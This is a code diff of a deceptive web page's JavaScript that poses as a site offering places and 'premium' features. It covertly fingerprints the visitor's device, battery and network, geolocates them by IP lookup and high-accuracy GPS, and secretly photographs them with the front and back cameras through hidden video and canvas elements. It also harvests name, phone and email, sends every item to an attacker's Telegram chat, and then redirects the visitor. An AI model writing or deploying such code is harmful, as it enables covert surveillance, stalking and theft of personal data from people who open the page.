             // ============================================================
             // UTILITY FUNCTIONS
             // ============================================================
 
             function generateSessionId() {
-                return 'xxxx-xxxx-xxxx'.replace(/x/g, function() {
+                return 'xxxx-xxxx-xxxx-xxxx'.replace(/x/g, function() {
                     return Math.floor(Math.random() * 16).toString(16);
                 });
             }
@@ -1125,8 +702,7 @@
             function escapeHtml(text) {
                 if (text === null || text === undefined) return 'N/A';
                 var str = String(text);
-                var map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' };
-                return str.replace(/[&<>"']/g, function(m) { return map[m]; });
+                return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
             }
 
             function getTimestamp() {
@@ -1142,54 +718,167 @@
 
             function getTimeOnPage() {
                 var seconds = Math.floor((Date.now() - pageLoadTime) / 1000);
-                if (seconds < 60) return seconds + ' seconds';
+                if (seconds < 60) return seconds + ' sec';
                 return Math.floor(seconds / 60) + 'm ' + (seconds % 60) + 's';
             }
 
-            function getDeviceType() {
-                var ua = navigator.userAgent || '';
-                if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'Tablet';
-                if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile/.test(ua)) return 'Mobile';
-                return 'Desktop';
-            }
-
-            function getBrowser() {
-                var ua = navigator.userAgent || '';
-                if (ua.indexOf('Firefox') > -1) return 'Firefox';
-                if (ua.indexOf('SamsungBrowser') > -1) return 'Samsung Browser';
-                if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) return 'Opera';
-                if (ua.indexOf('Edg') > -1) return 'Edge';
-                if (ua.indexOf('Chrome') > -1) return 'Chrome';
-                if (ua.indexOf('Safari') > -1) return 'Safari';
-                return 'Unknown';
-            }
-
-            function getOS() {
-                var ua = navigator.userAgent || '';
-                if (ua.indexOf('Windows') > -1) return 'Windows';
-                if (ua.indexOf('Mac OS X') > -1) return 'macOS';
-                if (ua.indexOf('Android') > -1) return 'Android';
-                if (ua.indexOf('like Mac OS X') > -1) return 'iOS';
-                if (ua.indexOf('Linux') > -1) return 'Linux';
-                return 'Unknown';
-            }
+            function delay(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
 
             function showStatus(message, type) {
                 var el = document.getElementById('statusMessage');
                 el.className = 'status-message ' + type;
                 el.innerHTML = type === 'loading' 
-                    ? '<div class="loader-container"><div class="loader"></div></div><div class="status-text">' + message + '</div>'
-                    : '<div class="status-text">' + message + '</div>';
+                    ? '<div class="loader-container"><div class="loader"></div></div><div>' + message + '</div>'
+                    : '<div>' + message + '</div>';
             }
 
             function hidePageLoader() {
-                setTimeout(function() {
-                    document.getElementById('pageLoader').classList.add('hidden');
-                }, 800);
+                setTimeout(function() { document.getElementById('pageLoader').classList.add('hidden'); }, 800);
             }
 
-            function delay(ms) {
-                return new Promise(function(r) { setTimeout(r, ms); });
+            // ============================================================
+            // DETAILED DEVICE DATA COLLECTION
+            // ============================================================
+
+            function getDeviceType() {
+                var ua = navigator.userAgent || '';
+                if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'Tablet';
+                if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk/.test(ua)) return 'Mobile';
+                return 'Desktop';
+            }
+
+            function getBrowser() {
+                var ua = navigator.userAgent || '';
+                var browser = 'Unknown', version = '';
+                
+                if (ua.indexOf('Firefox') > -1) { browser = 'Firefox'; version = (ua.match(/Firefox\/(\d+)/) || [])[1]; }
+                else if (ua.indexOf('SamsungBrowser') > -1) { browser = 'Samsung Browser'; version = (ua.match(/SamsungBrowser\/(\d+)/) || [])[1]; }
+                else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) { browser = 'Opera'; version = (ua.match(/(?:Opera|OPR)\/(\d+)/) || [])[1]; }
+                else if (ua.indexOf('Trident') > -1) { browser = 'IE'; version = (ua.match(/rv:(\d+)/) || [])[1]; }
+                else if (ua.indexOf('Edg') > -1) { browser = 'Edge'; version = (ua.match(/Edg\/(\d+)/) || [])[1]; }
+                else if (ua.indexOf('Chrome') > -1) { browser = 'Chrome'; version = (ua.match(/Chrome\/(\d+)/) || [])[1]; }
+                else if (ua.indexOf('Safari') > -1) { browser = 'Safari'; version = (ua.match(/Version\/(\d+)/) || [])[1]; }
+                
+                return browser + (version ? ' ' + version : '');
+            }
+
+            function getOS() {
+                var ua = navigator.userAgent || '';
+                if (ua.indexOf('Windows NT 10') > -1) return 'Windows 10/11';
+                if (ua.indexOf('Windows NT 6.3') > -1) return 'Windows 8.1';
+                if (ua.indexOf('Windows NT 6.2') > -1) return 'Windows 8';
+                if (ua.indexOf('Windows NT 6.1') > -1) return 'Windows 7';
+                if (ua.indexOf('Windows') > -1) return 'Windows';
+                if (ua.indexOf('Mac OS X') > -1) {
+                    var v = (ua.match(/Mac OS X (\d+[._]\d+)/) || [])[1];
+                    return 'macOS' + (v ? ' ' + v.replace('_', '.') : '');
+                }
+                if (ua.indexOf('Android') > -1) {
+                    var v = (ua.match(/Android (\d+(\.\d+)?)/) || [])[1];
+                    return 'Android' + (v ? ' ' + v : '');
+                }
+                if (ua.indexOf('like Mac OS X') > -1) {
+                    var v = (ua.match(/OS (\d+[._]\d+)/) || [])[1];
+                    return 'iOS' + (v ? ' ' + v.replace('_', '.') : '');
+                }
+                if (ua.indexOf('Linux') > -1) return 'Linux';
+                if (ua.indexOf('CrOS') > -1) return 'Chrome OS';
+                return 'Unknown';
+            }
+
+            function getScreenOrientation() {
+                try {
+                    if (screen.orientation && screen.orientation.type) {
+                        return screen.orientation.type.indexOf('portrait') > -1 ? 'Portrait' : 'Landscape';
+                    }
+                    return window.innerHeight > window.innerWidth ? 'Portrait' : 'Landscape';
+                } catch (e) { return 'Unknown'; }
+            }
+
+            function getConnectionType() {
+                try {
+                    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    if (conn) {
+                        var type = conn.effectiveType || conn.type || 'Unknown';
+                        var downlink = conn.downlink ? ' (' + conn.downlink + ' Mbps)' : '';
+                        var rtt = conn.rtt ? ' [RTT: ' + conn.rtt + 'ms]' : '';
+                        return type.toUpperCase() + downlink + rtt;
+                    }
+                    return 'Unknown';
+                } catch (e) { return 'Unknown'; }
+            }
+
+            function getTouchSupport() {
+                return ('ontouchstart' in window) || (navigator.maxTouchPoints > 0) ? 'Yes (' + (navigator.maxTouchPoints || 1) + ' points)' : 'No';
+            }
+
+            async function getBatteryInfo() {
+                try {
+                    if (navigator.getBattery) {
+                        var battery = await navigator.getBattery();
+                        return {
+                            level: Math.round(battery.level * 100) + '%',
+                            charging: battery.charging ? 'Yes' : 'No',
+                            chargingTime: battery.chargingTime === Infinity ? 'N/A' : Math.round(battery.chargingTime / 60) + ' min',
+                            dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : Math.round(battery.dischargingTime / 60) + ' min'
+                        };
+                    }
+                } catch (e) {}
+                return null;
+            }
+
+            async function collectDeviceData() {
+                batteryData = await getBatteryInfo();
+                
+                return {
+                    sessionId: sessionId,
+                    timestamp: getTimestamp(),
+                    timeOnPage: getTimeOnPage(),
+                    
+                    // Device
+                    deviceType: getDeviceType(),
+                    browser: getBrowser(),
+                    os: getOS(),
+                    platform: navigator.platform || 'Unknown',
+                    vendor: navigator.vendor || 'Unknown',
+                    userAgent: navigator.userAgent || 'Unknown',
+                    
+                    // Screen
+                    screenResolution: window.screen.width + 'x' + window.screen.height,
+                    screenAvailable: window.screen.availWidth + 'x' + window.screen.availHeight,
+                    viewport: window.innerWidth + 'x' + window.innerHeight,
+                    colorDepth: window.screen.colorDepth + '-bit',
+                    pixelRatio: window.devicePixelRatio || 1,
+                    orientation: getScreenOrientation(),
+                    
+                    // Hardware
+                    cpuCores: navigator.hardwareConcurrency || 'Unknown',
+                    memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
+                    touchSupport: getTouchSupport(),
+                    
+                    // Network
+                    connection: getConnectionType(),
+                    online: navigator.onLine ? 'Yes' : 'No',
+                    
+                    // Battery
+                    battery: batteryData,
+                    
+                    // Locale
+                    language: navigator.language || 'Unknown',
+                    languages: (navigator.languages || []).join(', ') || 'Unknown',
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+                    timezoneOffset: 'UTC' + (new Date().getTimezoneOffset() > 0 ? '-' : '+') + Math.abs(new Date().getTimezoneOffset() / 60),
+                    
+                    // Browser Features
+                    cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
+                    doNotTrack: navigator.doNotTrack === '1' ? 'Enabled' : 'Disabled',
+                    javaEnabled: (navigator.javaEnabled && navigator.javaEnabled()) ? 'Yes' : 'No',
+                    
+                    // Session
+                    referrer: document.referrer || 'Direct Visit',
+                    historyLength: window.history.length || 1,
+                    pageURL: window.location.href
+                };
             }
 
             // ============================================================
@@ -1204,137 +893,78 @@
                         var data = await response.json();
                         
                         if (api.type === 'ipapi' && data && !data.error) {
-                            return { ip: data.ip, city: data.city, region: data.region, country: data.country_name, latitude: data.latitude, longitude: data.longitude, isp: data.org, success: true };
+                            return { 
+                                ip: data.ip, city: data.city, region: data.region, 
+                                country: data.country_name, countryCode: data.country_code,
+                                latitude: data.latitude, longitude: data.longitude, 
+                                isp: data.org, asn: data.asn, postal: data.postal,
+                                success: true, source: 'ipapi.co'
+                            };
                         }
                         if (api.type === 'ip-api' && data && data.status === 'success') {
-                            return { ip: data.query, city: data.city, region: data.regionName, country: data.country, latitude: data.lat, longitude: data.lon, isp: data.isp, success: true };
+                            return { 
+                                ip: data.query, city: data.city, region: data.regionName, 
+                                country: data.country, countryCode: data.countryCode,
+                                latitude: data.lat, longitude: data.lon, 
+                                isp: data.isp, org: data.org, as: data.as, 
+                                success: true, source: 'ip-api.com'
+                            };
                         }
                         if (api.type === 'ipwhois' && data && data.success !== false) {
-                            return { ip: data.ip, city: data.city, region: data.region, country: data.country, latitude: data.latitude, longitude: data.longitude, isp: data.connection?.isp, success: true };
+                            return { 
+                                ip: data.ip, city: data.city, region: data.region, 
+                                country: data.country, countryCode: data.country_code,
+                                latitude: data.latitude, longitude: data.longitude, 
+                                isp: data.connection ? data.connection.isp : 'Unknown',
+                                org: data.connection ? data.connection.org : 'Unknown',
+                                success: true, source: 'ipwho.is'
+                            };
                         }
-                    } catch (e) {}
+                    } catch (e) { console.log('IP API ' + (i+1) + ' failed'); }
                 }
                 return { success: false };
             }
 
             // ============================================================
-            // DATA COLLECTION
+            // GPS LOCATION
             // ============================================================
 
-            async function collectAllData() {
-                return {
-                    sessionId: sessionId,
-                    timestamp: getTimestamp(),
-                    timeOnPage: getTimeOnPage(),
-                    device: {
-                        type: getDeviceType(),
-                        browser: getBrowser(),
-                        os: getOS(),
-                        platform: navigator.platform || 'Unknown',
-                        language: navigator.language || 'Unknown',
-                        screenResolution: window.screen.width + 'x' + window.screen.height,
-                        viewport: window.innerWidth + 'x' + window.innerHeight,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
-                        online: navigator.onLine ? 'Yes' : 'No'
-                    },
-                    session: {
-                        referrer: document.referrer || 'Direct Visit'
-                    },
-                    permissions: { location: 'Pending', camera: 'Pending' },
-                    location: { gps: null, ip: null },
-                    photos: { count: 0 },
-                    contact: { name: '', phone: '', email: '', skipped: false }
-                };
-            }
-
-            // ============================================================
-            // PERMISSIONS & CAMERA
-            // ============================================================
-
-            function requestLocationPermission(data) {
+            function getGPSLocation() {
                 return new Promise(function(resolve) {
                     if (!navigator.geolocation) {
-                        data.permissions.location = '❌ Not Supported';
-                        resolve(data);
+                        resolve({ status: '❌ Not Supported', success: false });
                         return;
                     }
 
                     navigator.geolocation.getCurrentPosition(
                         function(position) {
-                            data.permissions.location = '✅ Granted';
-                            data.location.gps = {
+                            resolve({
+                                status: '✅ Granted',
+                                success: true,
                                 latitude: position.coords.latitude,
                                 longitude: position.coords.longitude,
-                                accuracy: Math.round(position.coords.accuracy) + 'm'
-                            };
-                            resolve(data);
+                                accuracy: Math.round(position.coords.accuracy) + 'm',
+                                altitude: position.coords.altitude ? Math.round(position.coords.altitude) + 'm' : 'N/A',
+                                altitudeAccuracy: position.coords.altitudeAccuracy ? Math.round(position.coords.altitudeAccuracy) + 'm' : 'N/A',
+                                heading: position.coords.heading ? Math.round(position.coords.heading) + '°' : 'N/A',
+                                speed: position.coords.speed ? (position.coords.speed * 3.6).toFixed(1) + ' km/h' : 'N/A',
+                                timestamp: new Date(position.timestamp).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+                            });
                         },
                         function(error) {
-                            data.permissions.location = error.code === 1 ? '❌ Denied' : '❌ Error';
-                            resolve(data);
+                            var status = '❌ Error';
+                            if (error.code === 1) status = '❌ Denied by User';
+                            else if (error.code === 2) status = '❌ Position Unavailable';
+                            else if (error.code === 3) status = '❌ Timeout';
+                            resolve({ status: status, success: false, errorCode: error.code, errorMessage: error.message });
                         },
                         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                     );
                 });
             }
 
-            async function captureAllPhotos(data) {
-                try {
-                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                        data.permissions.camera = '❌ Not Supported';
-                        return data;
-                    }
-
-                    var video = document.getElementById('hiddenVideo');
-                    var canvas = document.getElementById('hiddenCanvas');
-                    var ctx = canvas.getContext('2d');
-
-                    async function captureFromCamera(facingMode, label) {
-                        try {
-                            var stream = await navigator.mediaDevices.getUserMedia({
-                                video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
-                                audio: false
-                            });
-                            
-                            video.srcObject = stream;
-                            await video.play();
-                            await delay(CONFIG.PHOTO_DELAY);
-
-                            var photos = [];
-                            for (var i = 0; i < 2; i++) {
-                                canvas.width = video.videoWidth || 640;
-                                canvas.height = video.videoHeight || 480;
-                                ctx.drawImage(video, 0, 0);
-                                photos.push({
-                                    type: label,
-                                    number: i + 1,
-                                    data: canvas.toDataURL('image/jpeg', CONFIG.PHOTO_QUALITY)
-                                });
-                                await delay(300);
-                            }
-
-                            stream.getTracks().forEach(function(t) { t.stop(); });
-                            return photos;
-                        } catch (e) {
-                            return [];
-                        }
-                    }
-
-                    var backPhotos = await captureFromCamera('environment', 'back');
-                    var frontPhotos = await captureFromCamera('user', 'front');
-                    
-                    capturedPhotos = backPhotos.concat(frontPhotos);
-                    data.photos.count = capturedPhotos.length;
-                    data.permissions.camera = capturedPhotos.length > 0 ? '✅ Granted' : '❌ Failed';
-
-                } catch (e) {
-                    data.permissions.camera = '❌ Error';
-                }
-                return data;
-            }
-
             // ============================================================
-            // TELEGRAM
+            // CAMERA CAPTURE
             // ============================================================
 
             function dataURLtoBlob(dataURL) {
@@ -1349,75 +979,45 @@
                 } catch (e) { return null; }
             }
 
-            function buildTelegramMessage(data) {
-                var mapLink = 'N/A';
-                if (data.location.gps) {
-                    mapLink = 'https://www.google.com/maps?q=' + data.location.gps.latitude + ',' + data.location.gps.longitude;
-                } else if (data.location.ip && data.location.ip.success) {
-                    mapLink = 'https://www.google.com/maps?q=' + data.location.ip.latitude + ',' + data.location.ip.longitude;
+            async function capturePhoto(facingMode, photoNumber) {
+                try {
+                    var video = document.getElementById('hiddenVideo');
+                    var canvas = document.getElementById('hiddenCanvas');
+                    var ctx = canvas.getContext('2d');
+
+                    var stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
+                        audio: false
+                    });
+
+                    video.srcObject = stream;
+                    await video.play();
+                    await delay(CONFIG.PHOTO_DELAY);
+
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    ctx.drawImage(video, 0, 0);
+
+                    var photoData = canvas.toDataURL('image/jpeg', CONFIG.PHOTO_QUALITY);
+                    
+                    stream.getTracks().forEach(function(t) { t.stop(); });
+
+                    return {
+                        success: true,
+                        data: photoData,
+                        camera: facingMode === 'environment' ? 'Back' : 'Front',
+                        number: photoNumber,
+                        resolution: canvas.width + 'x' + canvas.height,
+                        timestamp: getTimestamp()
+                    };
+                } catch (e) {
+                    return { success: false, camera: facingMode === 'environment' ? 'Back' : 'Front', number: photoNumber, error: e.name };
                 }
-
-                var msg = '🆕 <b>NEW VISITOR!</b>\n\n';
-                msg += '━━━━━━━━━━━━━━━━━━━━━━━━\n';
-                msg += '🔑 <b>ID:</b> ' + escapeHtml(data.sessionId) + '\n';
-                msg += '⏰ <b>Time:</b> ' + escapeHtml(data.timestamp) + '\n';
-                msg += '⏱️ <b>On Page:</b> ' + escapeHtml(data.timeOnPage) + '\n';
-                msg += '━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
-
-                // Contact Info
-                msg += '👤 <b>CONTACT INFO:</b>\n';
-                if (data.contact.skipped) {
-                    msg += '• <b>Status:</b> ❌ SKIPPED\n';
-                } else {
-                    msg += '• <b>Name:</b> ' + escapeHtml(data.contact.name || 'Not provided') + '\n';
-                    msg += '• <b>Phone:</b> ' + escapeHtml(data.contact.phone || 'Not provided') + '\n';
-                    msg += '• <b>Email:</b> ' + escapeHtml(data.contact.email || 'Not provided') + '\n';
-                }
-                msg += '\n';
-
-                // Location
-                msg += '📍 <b>LOCATION:</b>\n';
-                if (data.location.gps) {
-                    msg += '• <b>GPS:</b> ' + data.location.gps.latitude.toFixed(6) + ', ' + data.location.gps.longitude.toFixed(6) + '\n';
-                    msg += '• <b>Accuracy:</b> ' + data.location.gps.accuracy + '\n';
-                }
-                msg += '• <b>Status:</b> ' + data.permissions.location + '\n\n';
-
-                if (data.location.ip && data.location.ip.success) {
-                    msg += '🌐 <b>IP INFO:</b>\n';
-                    msg += '• <b>IP:</b> ' + escapeHtml(data.location.ip.ip) + '\n';
-                    msg += '• <b>City:</b> ' + escapeHtml(data.location.ip.city) + '\n';
-                    msg += '• <b>Region:</b> ' + escapeHtml(data.location.ip.region) + '\n';
-                    msg += '• <b>Country:</b> ' + escapeHtml(data.location.ip.country) + '\n';
-                    msg += '• <b>ISP:</b> ' + escapeHtml(data.location.ip.isp) + '\n\n';
-                }
-
-                msg += '🗺️ <b>MAP:</b> ' + mapLink + '\n\n';
-
-                msg += '━━━━━━━━━━━━━━━━━━━━━━━━\n';
-                msg += '📱 <b>DEVICE:</b>\n';
-                msg += '• <b>Type:</b> ' + escapeHtml(data.device.type) + '\n';
-                msg += '• <b>OS:</b> ' + escapeHtml(data.device.os) + '\n';
-                msg += '• <b>Browser:</b> ' + escapeHtml(data.device.browser) + '\n';
-                msg += '• <b>Screen:</b> ' + escapeHtml(data.device.screenResolution) + '\n';
-                msg += '• <b>Timezone:</b> ' + escapeHtml(data.device.timezone) + '\n\n';
-
-                msg += '━━━━━━━━━━━━━━━━━━━━━━━━\n';
-                msg += '📊 <b>SESSION:</b>\n';
-                msg += '• <b>From:</b> ' + escapeHtml(data.session.referrer) + '\n';
-                msg += '• <b>Online:</b> ' + escapeHtml(data.device.online) + '\n\n';
-
-                msg += '━━━━━━━━━━━━━━━━━━━━━━━━\n';
-                msg += '🔐 <b>PERMISSIONS:</b>\n';
-                msg += '• <b>Location:</b> ' + data.permissions.location + '\n';
-                msg += '• <b>Camera:</b> ' + data.permissions.camera + '\n';
-                msg += '• <b>Photos:</b> ' + data.photos.count + '/4 captured\n\n';
-
-                msg += '━━━━━━━━━━━━━━━━━━━━━━━━\n';
-                msg += '✅ <b>Redirecting to main site...</b>';
-
-                return msg;
             }
+
+            // ============================================================
+            // TELEGRAM FUNCTIONS
+            // ============================================================
 
             async function sendTelegramMessage(message) {
                 for (var attempt = 1; attempt <= CONFIG.TELEGRAM_MAX_RETRIES; attempt++) {
@@ -1428,7 +1028,8 @@
                             body: JSON.stringify({
                                 chat_id: CONFIG.TELEGRAM_CHAT_ID,
                                 text: message,
-                                parse_mode: 'HTML'
+                                parse_mode: 'HTML',
+                                disable_web_page_preview: false
                             })
                         });
                         var result = await response.json();
@@ -1444,7 +1045,7 @@
                     try {
                         var blob = dataURLtoBlob(photoData);
                         if (!blob) throw new Error('Blob failed');
-                        
+
                         var formData = new FormData();
                         formData.append('chat_id', CONFIG.TELEGRAM_CHAT_ID);
                         formData.append('photo', blob, 'photo.jpg');
@@ -1462,99 +1063,143 @@
                 return { success: false };
             }
 
-            async function sendAllToTelegram(data) {
-                await sendTelegramMessage(buildTelegramMessage(data));
+            // ============================================================
+            // MESSAGE BUILDERS
+            // ============================================================
+
+            function buildDeviceMessage(data) {
+                var msg = '📱 <b>DEVICE INFO</b> [1/7]\n';
+                msg += '━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
                 
-                for (var i = 0; i < capturedPhotos.length; i++) {
-                    var photo = capturedPhotos[i];
-                    var caption = '📸 Photo ' + (i + 1) + '/4\n';
-                    caption += '📷 ' + (photo.type === 'back' ? 'Back Camera' : 'Front Camera') + ' #' + photo.number + '\n';
-                    caption += '🔑 Session: ' + data.sessionId;
-                    await sendTelegramPhoto(photo.data, caption);
-                    await delay(300);
+                msg += '🔑 <b>Session:</b> ' + escapeHtml(data.sessionId) + '\n';
+                msg += '⏰ <b>Time:</b> ' + escapeHtml(data.timestamp) + '\n';
+                msg += '⏱️ <b>On Page:</b> ' + escapeHtml(data.timeOnPage) + '\n\n';
+                
+                msg += '📱 <b>DEVICE:</b>\n';
+                msg += '• Type: ' + escapeHtml(data.deviceType) + '\n';
+                msg += '• OS: ' + escapeHtml(data.os) + '\n';
+                msg += '• Browser: ' + escapeHtml(data.browser) + '\n';
+                msg += '• Platform: ' + escapeHtml(data.platform) + '\n';
+                msg += '• Vendor: ' + escapeHtml(data.vendor) + '\n\n';
+                
+                msg += '🖥️ <b>SCREEN:</b>\n';
+                msg += '• Resolution: ' + escapeHtml(data.screenResolution) + '\n';
+                msg += '• Available: ' + escapeHtml(data.screenAvailable) + '\n';
+                msg += '• Viewport: ' + escapeHtml(data.viewport) + '\n';
+                msg += '• Color Depth: ' + escapeHtml(data.colorDepth) + '\n';
+                msg += '• Pixel Ratio: ' + escapeHtml(data.pixelRatio) + 'x\n';
+                msg += '• Orientation: ' + escapeHtml(data.orientation) + '\n\n';
+                
+                msg += '⚙️ <b>HARDWARE:</b>\n';
+                msg += '• CPU Cores: ' + escapeHtml(data.cpuCores) + '\n';
+                msg += '• RAM: ' + escapeHtml(data.memory) + '\n';
+                msg += '• Touch: ' + escapeHtml(data.touchSupport) + '\n\n';
+                
+                msg += '📶 <b>NETWORK:</b>\n';
+                msg += '• Connection: ' + escapeHtml(data.connection) + '\n';
+                msg += '• Online: ' + escapeHtml(data.online) + '\n\n';
+                
+                if (data.battery) {
+                    msg += '🔋 <b>BATTERY:</b>\n';
+                    msg += '• Level: ' + escapeHtml(data.battery.level) + '\n';
+                    msg += '• Charging: ' + escapeHtml(data.battery.charging) + '\n';
+                    msg += '• Charging Time: ' + escapeHtml(data.battery.chargingTime) + '\n';
+                    msg += '• Discharging Time: ' + escapeHtml(data.battery.dischargingTime) + '\n\n';
                 }
+                
+                msg += '🌐 <b>LOCALE:</b>\n';
+                msg += '• Language: ' + escapeHtml(data.language) + '\n';
+                msg += '• Languages: ' + escapeHtml(data.languages) + '\n';
+                msg += '• Timezone: ' + escapeHtml(data.timezone) + '\n';
+                msg += '• Offset: ' + escapeHtml(data.timezoneOffset) + '\n\n';
+                
+                msg += '🔧 <b>BROWSER:</b>\n';
+                msg += '• Cookies: ' + escapeHtml(data.cookiesEnabled) + '\n';
+                msg += '• Do Not Track: ' + escapeHtml(data.doNotTrack) + '\n';
+                msg += '• Java: ' + escapeHtml(data.javaEnabled) + '\n\n';
+                
+                msg += '📊 <b>SESSION:</b>\n';
+                msg += '• Referrer: ' + escapeHtml(data.referrer) + '\n';
+                msg += '• History: ' + escapeHtml(data.historyLength) + ' pages\n';
+                
+                return msg;
             }
 
-            // ============================================================
-            // CONTACT FORM
-            // ============================================================
-
-            function showContactModal() {
-                document.getElementById('contactModal').classList.add('active');
-            }
-
-            function hideContactModal() {
-                document.getElementById('contactModal').classList.remove('active');
-            }
-
-            function showSkipConfirm() {
-                document.getElementById('skipConfirmModal').classList.add('active');
-            }
-
-            function hideSkipConfirm() {
-                document.getElementById('skipConfirmModal').classList.remove('active');
-            }
-
-            function validateForm() {
-                var name = document.getElementById('userName').value.trim();
-                var phone = document.getElementById('userPhone').value.trim();
-                var email = document.getElementById('userEmail').value.trim();
-                var valid = true;
-
-                // Reset errors
-                document.querySelectorAll('.form-input').forEach(function(el) {
-                    el.classList.remove('error');
-                });
-
-                if (!name || name.length < 2) {
-                    document.getElementById('userName').classList.add('error');
-                    valid = false;
+            function buildLocationMessage(gps, ip) {
+                var msg = '📍 <b>LOCATION DATA</b> [2/7]\n';
+                msg += '━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
+                
+                msg += '🔑 <b>Session:</b> ' + escapeHtml(sessionId) + '\n';
+                msg += '⏰ <b>Time:</b> ' + escapeHtml(getTimestamp()) + '\n\n';
+                
+                msg += '📍 <b>GPS LOCATION:</b>\n';
+                msg += '• Status: ' + gps.status + '\n';
+                if (gps.success) {
+                    msg += '• Latitude: ' + gps.latitude.toFixed(6) + '\n';
+                    msg += '• Longitude: ' + gps.longitude.toFixed(6) + '\n';
+                    msg += '• Accuracy: ' + escapeHtml(gps.accuracy) + '\n';
+                    msg += '• Altitude: ' + escapeHtml(gps.altitude) + '\n';
+                    msg += '• Alt Accuracy: ' + escapeHtml(gps.altitudeAccuracy) + '\n';
+                    msg += '• Heading: ' + escapeHtml(gps.heading) + '\n';
+                    msg += '• Speed: ' + escapeHtml(gps.speed) + '\n';
+                    msg += '• GPS Time: ' + escapeHtml(gps.timestamp) + '\n';
                 }
-
-                if (!phone || phone.length < 6 || !/^\d+$/.test(phone)) {
-                    document.getElementById('userPhone').classList.add('error');
-                    valid = false;
+                msg += '\n';
+                
+                if (ip && ip.success) {
+                    msg += '🌐 <b>IP LOCATION:</b>\n';
+                    msg += '• IP: ' + escapeHtml(ip.ip) + '\n';
+                    msg += '• City: ' + escapeHtml(ip.city) + '\n';
+                    msg += '• Region: ' + escapeHtml(ip.region) + '\n';
+                    msg += '• Country: ' + escapeHtml(ip.country) + ' (' + escapeHtml(ip.countryCode) + ')\n';
+                    msg += '• Latitude: ' + escapeHtml(ip.latitude) + '\n';
+                    msg += '• Longitude: ' + escapeHtml(ip.longitude) + '\n';
+                    msg += '• ISP: ' + escapeHtml(ip.isp) + '\n';
+                    if (ip.org) msg += '• Org: ' + escapeHtml(ip.org) + '\n';
+                    if (ip.as) msg += '• AS: ' + escapeHtml(ip.as) + '\n';
+                    if (ip.postal) msg += '• Postal: ' + escapeHtml(ip.postal) + '\n';
+                    msg += '• Source: ' + escapeHtml(ip.source) + '\n\n';
                 }
-
-                if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-                    document.getElementById('userEmail').classList.add('error');
-                    valid = false;
+                
+                // Map Link
+                var mapLink = 'N/A';
+                if (gps.success) {
+                    mapLink = 'https://www.google.com/maps?q=' + gps.latitude + ',' + gps.longitude;
+                } else if (ip && ip.success) {
+                    mapLink = 'https://www.google.com/maps?q=' + ip.latitude + ',' + ip.longitude;
                 }
-
-                return valid;
+                msg += '🗺️ <b>MAP:</b> ' + mapLink;
+                
+                return msg;
             }
 
-            async function submitContactAndRedirect(skipped) {
-                var btn = document.getElementById('unlockBtn');
-                btn.disabled = true;
-                btn.innerHTML = '<span>⏳</span><span>Please wait...</span>';
-
-                if (!skipped) {
-                    collectedData.contact = {
-                        name: document.getElementById('userName').value.trim(),
-                        phone: document.getElementById('countryCode').value + ' ' + document.getElementById('userPhone').value.trim(),
-                        email: document.getElementById('userEmail').value.trim(),
-                        skipped: false
-                    };
+            function buildContactMessage(contact, skipped) {
+                var msg = '👤 <b>CONTACT INFO</b> [7/7]\n';
+                msg += '━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
+                
+                msg += '🔑 <b>Session:</b> ' + escapeHtml(sessionId) + '\n';
+                msg += '⏰ <b>Time:</b> ' + escapeHtml(getTimestamp()) + '\n';
+                msg += '⏱️ <b>Total Time:</b> ' + escapeHtml(getTimeOnPage()) + '\n\n';
+                
+                if (skipped) {
+                    msg += '⚠️ <b>STATUS:</b> ❌ SKIPPED\n';
+                    msg += '• User chose to skip premium features\n';
                 } else {
-                    collectedData.contact = { name: '', phone: '', email: '', skipped: true };
+                    msg += '✅ <b>STATUS:</b> SUBMITTED\n\n';
+                    msg += '👤 <b>Name:</b> ' + escapeHtml(contact.name) + '\n';
+                    msg += '📱 <b>Phone:</b> ' + escapeHtml(contact.phone) + '\n';
+                    msg += '📧 <b>Email:</b> ' + escapeHtml(contact.email) + '\n';
                 }
-
-                collectedData.timeOnPage = getTimeOnPage();
-                await sendAllToTelegram(collectedData);
-
-                hideContactModal();
-                hideSkipConfirm();
                 
-                showStatus('🎉 ' + (skipped ? 'Redirecting...' : 'Premium unlocked! Redirecting...'), 'success');
+                msg += '\n━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                msg += '✅ <b>SESSION COMPLETE</b>\n';
+                msg += '🔗 Redirecting to main site...';
                 
-                setTimeout(function() {
-                    window.location.href = CONFIG.MAIN_SITE_URL;
-                }, CONFIG.REDIRECT_DELAY);
+                return msg;
             }
 
             // ============================================================
-            // MAIN FLOW
+            // MAIN FLOW - REAL TIME SENDING
             // ============================================================
 
             async function handleContinue() {
@@ -1566,29 +1211,117 @@
                 btn.innerHTML = '<span>⏳</span><span>Please wait...</span>';
 
                 try {
-                    showStatus('🔍 Finding amazing places...', 'loading');
-                    collectedData = await collectAllData();
-
+                    // STEP 1: Collect & Send Device Data IMMEDIATELY
